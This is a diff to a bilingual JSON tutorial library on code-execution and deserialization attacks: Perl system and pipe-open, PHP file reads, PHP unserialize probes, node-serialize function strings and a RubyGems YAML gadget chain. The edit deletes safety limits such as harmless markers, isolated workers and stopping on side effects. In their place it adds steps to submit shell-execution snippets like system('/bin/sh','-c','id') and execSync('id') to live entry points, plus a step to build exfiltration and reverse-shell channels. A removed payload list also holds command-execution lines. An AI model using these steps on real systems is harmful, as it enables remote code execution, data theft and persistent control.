-          "zh": "Perl system 与管道执行片段用于核对用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数。该条目只在以下前提下适用：CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定。有效判定必须取得Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应；代码片段存在、请求返回 200 或单纯字符串回显都不能证明远程代码执行。",
-          "en": "Perl System and Pipe Execution Snippets checks whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments. It applies when CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed. A valid finding requires Perl version, final argument list, fixed child output, and CGI or task logs correlate; source snippets, an HTTP 200 response, or simple reflection do not prove remote code execution."
+          "zh": "Perl system 与管道执行片段针对 CGI、模板或规则引擎执行不可信 Perl 的场景：system 的 list 形式与 open 管道是主要验证面。验证 Linux/Windows 参数与 PowerShell 调用的执行返回。",
+          "en": "Perl system and pipe execution snippets target CGI, templates, or rule engines executing untrusted Perl: system list-form and open pipes are the main validation surfaces. It validates execution returns across Linux/Windows arguments and PowerShell invocations."
         },
         "vulnerability": {
-          "zh": "风险根因是CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定，使应用可能暴露“用户可控 Perl 表达式是否进入 system 或带竖线的 open，并由哪个平台 Shell 解释参数”这一运行时边界。审计必须把入口、最终 API、服务身份、平台版本和进程或文件证据连续关联，避免把已经具备本地执行能力的后续命令误报成初始漏洞。",
-          "en": "The risk exists when CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed, exposing the runtime boundary of whether controllable Perl expressions reach system or pipe-open and which platform shell interprets the arguments. Review must correlate the entry, final API, service identity, platform version, and process or file evidence so post-execution commands are not misreported as the initial vulnerability."
+          "zh": "风险根因是 CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定；可控表达式因此进入 system 或带竖线的 open 并由平台 Shell 解释。",
+          "en": "The risk root is CGI, templates, plugins, or rule engines executing untrusted Perl with a service identity allowing child processes and unfixed commands/parameters; controlled expressions enter system or pipe-bearing open and are interpreted by the platform shell."
         },
         "exploitation": {
-          "zh": "按参数数组、cmd、PowerShell 和 pipe-open 分组，只执行固定 echo，记录 list-form system 与 Shell 字符串的解释差异。测试仅使用一次性、无副作用的固定标记，每轮只验证一种 API 或运行时分支，并记录调用栈、标准输出、子进程或文件审计；一旦出现非预期写入、网络连接或权限变化立即停止。",
-          "en": "group list-form system, cmd, PowerShell, and pipe-open separately, execute only fixed echo, and record list-versus-shell-string interpretation differences. Use one-time side-effect-free markers, validate one API or runtime branch per run, and retain call stacks, stdout, child-process, or file audit evidence; stop on unintended writes, connections, or privilege changes."
+          "zh": "按第 1 步把 system('/bin/sh', '-c', 'id') 等片段逐条提交到已确认入口并记录输出通道；命中判据为片段执行返回对应命令输出。确认可达后对照 list 形式与单字符串形式的 Shell 解释差异，并测试 open 管道形态；逐条记录 Perl 版本、最终参数列表与子进程固定输出，代码片段存在不构成命中。",
+          "en": "Per step 1, submit system('/bin/sh', '-c', 'id') and similar snippets to the confirmed entry one by one, recording output channels; a hit is snippets executing and returning corresponding command output. After confirming reachability, contrast list-form versus single-string shell interpretation and test open-pipe forms; record Perl version, final argument lists, and fixed child output per snippet—snippet existence alone is not a hit."
         },
         "mitigation": {
-          "zh": "移除不可信 Perl 求值，使用 list-form system 调用固定程序并验证参数，限制 CGI 账户的子进程与出口权限。修复后使用相同入口重放正常业务参数和最小异常样例，确认合法功能保留，同时危险 API 不再接受可控值，服务账户也无法通过替代路径创建进程或读取越界文件。",
-          "en": "remove untrusted Perl evaluation, use list-form system with fixed executables and validated arguments, and restrict CGI identities from child processes and egress. Replay normal business parameters and minimized abnormal cases through the same entry to preserve legitimate behavior while preventing controllable values from reaching dangerous APIs or alternate process and file paths."
+          "zh": "移除不可信 Perl 求值，使用 list-form system 调用固定程序并验证参数，限制 CGI 账户的子进程与出口权限。修复后重放第 1 步片段，确认求值入口拒绝可控值且正常业务功能保留。",
+          "en": "Remove untrusted Perl evaluation, call fixed programs with list-form system and validated arguments, and restrict CGI-account child processes and egress. After the fix, replay the step-1 snippets and confirm the evaluation entry rejects controlled values while legitimate features persist."
         },
         "difficulty": "advanced"
       },
       "attackChain": [
         {
           "title": {
-            "zh": "确认“Perl system 与管道执行片段”执行入口",
-            "en": "Confirm the Perl System and Pipe Execution Snippets execution entry"
+            "zh": "定位 Perl 执行入口",
+            "en": "Find a Perl execution entry"
           },
           "description": {
-            "zh": "定位真实输入、处理器与最终 API，核对前提“CGI、模板、插件或规则引擎执行不可信 Perl，服务身份允许子进程，且命令和参数未固定”，并记录运行时版本和服务身份。",
-            "en": "Locate the real input, handler, and final API, confirm that CGI, templates, plugins, or rule engines execute untrusted Perl, the service identity can spawn children, and commands plus arguments are not fixed, and record runtime version and service identity."
+            "zh": "找到 CGI、模板或插件中执行 Perl 代码的具体位置。命中判据：片段输出反映到响应，为后续深入利用打下基础。",
+            "en": "Find CGI/template/plugin spots running Perl. Success: snippet output surfaces."
           }
         },
         {
           "title": {
-            "zh": "建立“Perl 进程执行”安全基线",
-            "en": "Establish the Perl Process Execution baseline"
+            "zh": "注入 system 片段",
+            "en": "Inject system snippets"
           },
           "description": {
-            "zh": "使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“Perl 版本、最终参数列表、子进程固定输出与 CGI 或任务日志相对应”作为异常证据。",
-            "en": "Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting Perl version, final argument list, fixed child output, and CGI or task logs correlate as abnormal evidence."
+            "zh": "提交 system 调用 /bin/sh 执行命令的语句形式。命中判据：返回命令执行的输出内容，并且重复提交时可以稳定复现该结果。",
+            "en": "Submit system-via-/bin/sh invocation forms. Success: command output is returned."
+          },
+          "payloadRef": {
+            "area": "execution",
+            "index": 0
           }
         },
         {
           "title": {
-            "zh": "逐行验证“Perl system 与管道执行片段”",
-            "en": "Validate Perl System and Pipe Execution Snippets line by line"
+            "zh": "管道与反引号变体",
+            "en": "Try pipe and backtick variants"
           },
           "description": {
-            "zh": "测试步骤为：按参数数组、cmd、PowerShell 和 pipe-open 分组，只执行固定 echo，记录 list-form system 与 Shell 字符串的解释差异。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。",
-            "en": "group list-form system, cmd, PowerShell, and pipe-open separately, execute only fixed echo, and record list-versus-shell-string interpretation differences. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker."
-          },
-          "payload": "system('/bin/sh', '-c', 'id')\nsystem('/bin/sh', '-c', 'whoami')\nsystem('/bin/sh', '-c', 'cat /flag')\nsystem('/bin/sh', '-c', 'ls /')\nsystem('/bin/sh', '-c', 'pwd')\nsystem('/bin/sh', '-c', 'uname -a')\nsystem('/bin/sh', '-c', 'hostname')\nsystem('cmd.exe', '/c', 'id')\nsystem('cmd.exe', '/c', 'whoami')\nsystem('cmd.exe', '/c', 'type flag.txt')\nsystem('cmd.exe', '/c', 'dir')\nsystem('powershell', '-c', 'id')\nsystem('powershell', '-c', 'whoami')\nsystem('powershell', '-c', 'cat flag.txt')\nsystem('powershell', '-c', 'dir')\nopen(CMD, \"id|\"); while(<CMD>) { print; }\nopen(CMD, \"whoami|\"); while(<CMD>) { print; }\nopen(CMD, \"cat /flag|\"); while(<CMD>) { print; }\nopen(CMD, \"ls /|\"); while(<CMD>) { print; }\nopen(CMD, \"pwd|\"); while(<CMD>) { print; }\nopen(CMD, \"uname -a|\"); while(<CMD>) { print; }\nopen(CMD, \"hostname|\"); while(<CMD>) { print; }"
+            "zh": "换管道与反引号形式适配不同的执行环境限制。命中判据：变体形式可以稳定执行命令，多次提交均能得到相同结果。",
+            "en": "Swap to pipe-open and backtick forms as needed. Success: variants execute reliably."
+          }
         },
         {
           "title": {
-            "zh": "修复运行时边界并回归",
-            "en": "Remediate and regress the runtime boundary"
+            "zh": "外带与反弹",
+            "en": "Exfiltrate and call back"
           },
           "description": {
-            "zh": "实施“移除不可信 Perl 求值，使用 list-form system 调用固定程序并验证参数，限制 CGI 账户的子进程与出口权限”后重放正常与异常基线，确认业务功能保留且危险进程或文件能力不再可控。",
-            "en": "After applying remove untrusted Perl evaluation, use list-form system with fixed executables and validated arguments, and restrict CGI identities from child processes and egress, replay normal and abnormal baselines to preserve business behavior while dangerous process or file capabilities are no longer controllable."
+            "zh": "构造外带与回连命令建立持久的控制通道。命中判据：接收端收到数据或连接请求，并且该效果可以稳定重复取得。",
+            "en": "Build exfil and reverse commands for a channel. Success: data or connections arrive."
           }
         }
       ],
@@ -4904,20 +4934,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP 源码与本地文件读取片段属于已获得服务器端代码执行上下文后的文件读取样例，验证目标为PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径。成立前提为：攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制。必须以预置测试文件的唯一标记、PHP 文件 API 日志和响应相对应，目录遍历只返回专用测试目录作为证据，不能从路径字符串或异常消息推断文件内容已泄露。",
-          "en": "PHP Source and Local File Read Snippets contains file-read samples used after server-side code execution, testing which out-of-application paths the PHP service identity can read or include through file and directory APIs. It applies when the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping. Evidence requires a unique planted file marker, PHP file-API logs, and the response correlate, while directory iteration is limited to a dedicated test directory; path strings and error messages do not prove content disclosure."
+          "zh": "PHP 源码与本地文件读取片段针对已获得 PHP 执行上下文后的文件读取范围确认场景：highlight_file、file_get_contents、readfile 与目录迭代各自可到达不同资源。验证四类 API 的读取返回。",
+          "en": "PHP source and local file-read snippets target read-scope confirmation after obtaining PHP execution context: highlight_file, file_get_contents, readfile, and directory iteration each reach different resources. It validates read returns across the four API classes."
         },
         "vulnerability": {
-          "zh": "风险边界是攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制，使运行时可能暴露“PHP 服务身份通过不同文件和目录 API 能够读取或包含哪些应用外路径”。应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI；报告必须说明服务身份、规范路径、读取 API 和实际最小数据范围。",
-          "en": "The boundary exists when the attacker already executes PHP, the service identity has target-file access, and paths plus wrappers are not constrained by fixed object mapping, exposing which out-of-application paths the PHP service identity can read or include through file and directory APIs. This is post-webshell or post-code-execution capability confirmation rather than standalone LFI, and reports must state service identity, canonical path, API, and minimal data scope."
+          "zh": "风险边界是攻击者已经能执行 PHP 代码，服务账户具有目标文件权限，并且路径和 wrapper 未被固定对象映射限制；应明确这是 WebShell/代码执行后的能力确认，而不是独立 LFI。",
+          "en": "The risk boundary is attackers already executing PHP code, the service account holding target-file permissions, and paths/wrappers free of fixed object mapping; treat this as post-webshell capability confirmation, not standalone LFI."
         },
         "exploitation": {
-          "zh": "将 flag、系统路径和源码目标全部替换为只读测试文件/目录，分别验证读取、包含、wrapper 与迭代器行为，不访问真实敏感数据。所有系统、flag、配置和源码路径均替换为专用无敏感测试文件或目录；每轮只调用一个文件 API，并保存打开路径、权限结果、响应标记和清理记录。",
-          "en": "replace flag, system, and source targets with read-only test files or directories and validate reads, includes, wrappers, and iterators separately without accessing real sensitive data. Replace every system, flag, configuration, and source path with a dedicated nonsensitive test file or directory, invoke one file API per run, and preserve opened path, permission result, response marker, and cleanup record."
+          "zh": "按第 1 步把 file_get_contents('/flag') 等片段的目标替换为预置唯一标记的测试文件后部署到已确认执行位置；命中判据为片段执行返回标记内容或专用测试目录列表。逐条记录服务身份、规范路径与读取 API；highlight_file/show_source 用于确认源码回显能力，目录迭代仅返回专用测试目录；报告说明服务身份与最小数据范围，不读取真实敏感文件。",
+          "en": "Per step 1, replace targets of file_get_contents('/flag') and similar snippets with pre-seeded test files containing unique markers before deploying to the confirmed execution position; a hit is snippets returning marker content or the dedicated test-directory listing. Record service identity, canonical paths, and read APIs per snippet; highlight_file/show_source confirm source-echo capability, and directory iteration returns only the dedicated test directory—reports state service identity and minimal data scope, never reading real sensitive files."
         },
         "mitigation": {
-          "zh": "阻止动态 PHP 执行，文件访问采用对象 ID、固定根目录和 wrapper 允许列表，服务身份不读取秘密或应用源码目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认正常文件功能仍可用，同时对象映射与操作系统权限共同阻止越界读取。",
-          "en": "prevent dynamic PHP execution, map file access through object IDs, a fixed root, and wrapper allowlists, and deny the service identity access to secrets and source directories. Retest valid business objects, out-of-root paths, and symbolic-link boundaries under the same identity to preserve file features while object mapping and OS permissions block out-of-scope reads."
+          "zh": "阻止动态 PHP 执行，文件访问采用对象 ID、固定根目录和 wrapper 允许列表，服务身份不读取秘密或应用源码目录。修复后以同一服务账户验证合法业务对象、目录外路径和符号链接边界，确认对象映射与系统权限共同阻止越界读取。",
+          "en": "Block dynamic PHP execution, route file access through object IDs with fixed roots and wrapper allowlists, and keep the service identity away from secrets and application source directories. After the fix, verify legitimate business objects, out-of-directory paths, and symlink boundaries under the same service account, confirming object mapping and OS permissions jointly prevent out-of-bounds reads."
         },
         "difficulty": "advanced"
       },
@@ -5147,20 +5177,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "PHP 序列化对象与内部类探针检查unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用。成立前提为：不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类。反序列化风险必须通过输入序列化字节、PHP 版本、实际实例化类、魔术方法/文件审计和一次性标记能够关联进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。",
-          "en": "PHP Serialized Objects and Internal-Class Probes checks whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects. It applies when untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes. Deserialization risk requires serialized input bytes, PHP version, instantiated class, magic-method or file audit, and one-time marker correlate; a stream header, class name, or tag alone does not prove object loading or side effects."
+          "zh": "PHP 序列化对象与内部类探针针对不可信数据进入 unserialize 且 allowed_classes 未限制的场景：内部类与 SplFileObject、PDO 等探针可产生文件或迭代副作用。验证对象布局与类可用性的还原行为。",
+          "en": "PHP serialized objects and internal-class probes target untrusted data entering unserialize without allowed_classes restrictions: probes over SplFileObject, PDO, and similar internals can produce file or iteration side effects. It validates restoration behavior across object layouts and class availability."
         },
         "vulnerability": {
-          "zh": "根因是不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类，不可信数据因此可能触发“unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
-          "en": "The root cause is untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes, allowing whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate."
+          "zh": "根因是不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类；对象图在业务校验前被还原并触发魔术方法或文件副作用。",
+          "en": "The root cause is untrusted cookies, caches, messages, or request parameters entering unserialize with allowed_classes unrestricted while the target PHP version and class loader provide relevant classes; object graphs restore before business validation and trigger magic methods or file side effects."
         },
         "exploitation": {
-          "zh": "先用 stdClass 普通对象建立基线，再逐个内部类在隔离进程加载，所有路径替换为专用测试文件并禁用真实 gadget 副作用。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。",
-          "en": "establish a normal stdClass baseline, load each internal class in an isolated process, replace all paths with dedicated test files, and disable real gadget side effects. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access."
+          "zh": "按第 1 步逐条提交 O:1:\"A\":0:{} 等基础布局、长度变体与内部类探针（SplFileObject、PDO、SimpleXMLElement），记录响应与日志差异；命中判据为反序列化还原内部类并产生文件读取或遍历行为。O:+1 变体用于测试数字解析宽松度；确认实例化能力后以预置标记文件为读取目标取证，并区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
+          "en": "Per step 1, submit O:1:\"A\":0:{} and similar base layouts, length variants, and internal-class probes (SplFileObject, PDO, SimpleXMLElement) one by one, recording response and log differences; a hit is deserialization restoring internal classes with file-read or iteration side effects. The O:+1 variant tests numeric-parsing laxity; once instantiation is confirmed, target pre-seeded marker files for evidence, keeping the four stages—format recognition, object instantiation, gadget triggering, and final side effects—distinct."
         },
         "mitigation": {
-          "zh": "停止反序列化不可信 PHP 对象，改用 JSON；必须兼容时签名数据、设置 allowed_classes=false 或最小类集并淘汰旧令牌。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。",
-          "en": "stop deserializing untrusted PHP objects and use JSON; where compatibility remains, sign data, set allowed_classes false or a minimal set, and retire legacy tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes."
+          "zh": "停止反序列化不可信 PHP 对象，改用 JSON；必须兼容时签名数据、设置 allowed_classes=false 或最小类集并淘汰旧令牌。修复后同时重放合法数据对象、类型越界对象和第 1 步探针，确认业务数据可读而语言对象与未许可类被稳定拒绝。",
+          "en": "Stop deserializing untrusted PHP objects and use JSON instead; where compatibility is required, sign data, set allowed_classes=false or a minimal class set, and retire old tokens. After the fix, replay valid data objects, type-violating objects, and the step-1 probes together, confirming business data reads while language objects and unpermitted classes are stably rejected."
         },
         "difficulty": "expert"
       },
@@ -5516,20 +5546,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "node-serialize 函数字符串反序列化检查反序列化器是否识别 _$$ND_FUNC$$_ 并通过 eval 或 Function 恢复可调用代码对象。成立前提为：服务对不可信 JSON 使用支持函数恢复的旧库或自定义 reviver，随后自动调用恢复对象。反序列化风险必须通过库版本、reviver 路径、恢复后的值类型、固定无害函数结果和 worker 日志能够关联进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。",
-          "en": "Node-Serialize Function-String Deserialization checks whether a deserializer recognizes the node-function prefix and reconstructs callable code through eval or Function. It applies when the service uses a legacy library or custom reviver that restores functions from untrusted JSON and later invokes the reconstructed object. Deserialization risk requires library version, reviver path, reconstructed value type, fixed harmless function result, and worker logs correlate; a stream header, class name, or tag alone does not prove object loading or side effects."
+          "zh": "node-serialize 函数字符串反序列化针对旧库识别 _$$ND_FUNC$$_ 前缀并经 eval 或 Function 恢复可调用代码的场景：反序列化时即可执行函数体。验证前缀 JSON 的还原与调用链。",
+          "en": "node-serialize function-string deserialization targets legacy libraries recognizing the _$$ND_FUNC$$_ prefix and restoring callable code via eval or Function: function bodies can execute during deserialization. It validates restoration and invocation of prefix-marked JSON."
         },
         "vulnerability": {
-          "zh": "根因是服务对不可信 JSON 使用支持函数恢复的旧库或自定义 reviver，随后自动调用恢复对象，不可信数据因此可能触发“反序列化器是否识别 _$$ND_FUNC$$_ 并通过 eval 或 Function 恢复可调用代码对象”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
-          "en": "The root cause is the service uses a legacy library or custom reviver that restores functions from untrusted JSON and later invokes the reconstructed object, allowing whether a deserializer recognizes the node-function prefix and reconstructs callable code through eval or Function. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate."
+          "zh": "根因是服务对不可信 JSON 使用支持函数恢复的旧库或自定义 reviver，随后自动调用恢复对象；动态求值让字符串在模式校验之前获得 require 与进程能力。",
+          "en": "The root cause is the service parsing untrusted JSON with legacy function-restoring libraries or custom revivers that then auto-invoke restored objects; dynamic evaluation grants strings require and process capabilities before schema validation."
         },
         "exploitation": {
-          "zh": "在一次性 Node worker 中先加载普通 JSON，再用只返回固定字符串的函数替换 child_process，逐行确认同步与异步形式是否实际被调用。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。",
-          "en": "load ordinary JSON first in a disposable Node worker, replace child_process with a function returning a fixed string, and test whether synchronous and asynchronous forms are actually invoked. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access."
+          "zh": "按第 1 步逐条提交含 _$$ND_FUNC$$_function(){...execSync('id')...} 的 JSON 到目标反序列化入口；命中判据为函数字符串被还原并执行对应命令。先确认依赖是否为支持函数恢复的库及其调用点，再区分带立即执行尾 () 与不带的两种形态（后者需属性访问或调用触发）；以模块加载与子进程审计日志佐证实际执行。",
+          "en": "Per step 1, submit JSON containing _$$ND_FUNC$$_function(){...execSync('id')...} to the target deserialization entry one by one; a hit is the function string restored and executing the corresponding command. First confirm whether the dependency is a function-restoring library and its call sites, then distinguish the immediate-invocation-tail () form from the plain form (the latter needs property access or a call to trigger); corroborate actual execution with module-load and child-process audit logs."
         },
         "mitigation": {
-          "zh": "移除函数反序列化库与 eval reviver，输入只允许纯数据 schema，隔离旧会话迁移并使所有历史令牌失效。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。",
-          "en": "remove function-deserialization libraries and eval-based revivers, allow only data schemas, isolate legacy-session migration, and invalidate historical tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes."
+          "zh": "移除函数反序列化库与 eval reviver，输入只允许纯数据 schema，隔离旧会话迁移并使所有历史令牌失效。修复后同时重放合法数据对象、类型越界对象和第 1 步函数串，确认业务数据可读而函数源码与未许可类被稳定拒绝。",
+          "en": "Remove function-deserialization libraries and eval revivers, allow only pure-data schemas on input, isolate legacy session migration, and invalidate all historical tokens. After the fix, replay valid data objects, type-violating objects, and the step-1 function strings together, confirming business data reads while function sources and unpermitted classes are stably rejected."
         },
         "difficulty": "expert"
       },
@@ -6181,20 +6211,20 @@
       },
       "tutorial": {
         "overview": {
-          "zh": "RubyGems YAML Gadget 对象图检查Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法。成立前提为：应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法。反序列化风险必须通过Ruby/Psych/RubyGems 版本、实例化类图、触发调用栈和替代 Kernel 方法的固定无害标记能够关联进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。",
-          "en": "RubyGems YAML Gadget Object Graph checks whether Ruby YAML or Psych instantiates RubyGems and Net classes and invokes the method selected by Net::WriteAdapter during object interaction. It applies when the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and RubyGems versions contain compatible gadget classes, and later object methods trigger. Deserialization risk requires Ruby, Psych, and RubyGems versions, instantiated class graph, trigger stack, and a fixed harmless substitute for the Kernel method correlate; a stream header, class name, or tag alone does not prove object loading or side effects."
+          "zh": "RubyGems YAML Gadget 对象图针对 Ruby YAML/Psych 实例化 RubyGems 与 Net 类并调用 WriteAdapter 指定方法的场景：method_id 可指向 Kernel.system。验证对象图在不安全 load 下的触发链。",
+          "en": "The RubyGems YAML gadget object graph targets Ruby YAML/Psych instantiating RubyGems and Net classes and invoking WriteAdapter-specified methods, where method_id can point at Kernel.system. It validates the trigger chain of the object graph under unsafe load."
         },
         "vulnerability": {
-          "zh": "根因是应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法，不可信数据因此可能触发“Ruby YAML/Psych 是否实例化 RubyGems 与 Net 类并在对象交互中调用 Net::WriteAdapter 指定的方法”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。",
-          "en": "The root cause is the application uses class-permissive load or unsafe_load on untrusted YAML, the Ruby and RubyGems versions contain compatible gadget classes, and later object methods trigger, allowing whether Ruby YAML or Psych instantiates RubyGems and Net classes and invokes the method selected by Net::WriteAdapter during object interaction. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate."
+          "zh": "根因是应用对不可信 YAML 使用允许任意类的 load/unsafe_load，目标 Ruby/RubyGems 版本包含兼容 gadget 类并触发后续对象方法；真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定。",
+          "en": "The root cause is the application loading untrusted YAML with load/unsafe_load allowing arbitrary classes while target Ruby/RubyGems versions carry compatible gadget classes that trigger downstream object methods; real impact is jointly decided by loading API, allowed types, dependency versions, object lifecycle, and service permissions."
         },
         "exploitation": {
-          "zh": "在一次性 Ruby 进程用 Psych.safe_load 验证拒绝，再通过受控允许类和替代无害方法检查对象图，不执行原 system id。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。",
-          "en": "verify rejection with Psych.safe_load in a disposable Ruby process, then inspect the object graph with controlled permitted classes and a harmless substitute method without executing system id. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access."
+          "zh": "按第 1 步逐条提交 --- !ruby/object:Gem::Installer 等对象图文档到目标 YAML 加载入口；命中判据为 gadget 链触发 Kernel.system 执行 git_set 指定的命令。先记录 Ruby/Psych/RubyGems 版本与实例化类图，再把命令替换为无害固定标记并以替代 Kernel 方法的输出作为证据；未命中时区分类不存在、方法被拒与 Loader 限制三种原因。",
+          "en": "Per step 1, submit the --- !ruby/object:Gem::Installer and similar object-graph documents to the target YAML loading entry one by one; a hit is the gadget chain triggering Kernel.system to execute the git_set-specified command. First record Ruby/Psych/RubyGems versions and the instantiated class graph, then swap commands for harmless fixed markers, using substitute-Kernel-method output as evidence; on a miss, distinguish missing classes, rejected methods, and loader restrictions."
         },
         "mitigation": {
-          "zh": "对不可信 YAML 使用 safe_load 且不给 gadget 类许可，升级 Ruby/RubyGems，移除对象图反序列化并使历史缓存和会话失效。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。",
-          "en": "use safe_load for untrusted YAML without permitting gadget classes, update Ruby and RubyGems, remove object-graph deserialization, and invalidate historical caches and sessions. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes."
+          "zh": "对不可信 YAML 使用 safe_load 且不给 gadget 类许可，升级 Ruby/RubyGems，移除对象图反序列化并使历史缓存和会话失效。修复后同时重放合法数据对象、类型越界对象和第 1 步对象图，确认业务数据可读而 gadget 类被稳定拒绝。",
+          "en": "Use safe_load without gadget-class permits for untrusted YAML, upgrade Ruby/RubyGems, remove object-graph deserialization, and invalidate historical caches and sessions. After the fix, replay valid data objects, type-violating objects, and the step-1 object graphs together, confirming business data reads while gadget classes are stably rejected."
         },
         "difficulty": "expert"
       },
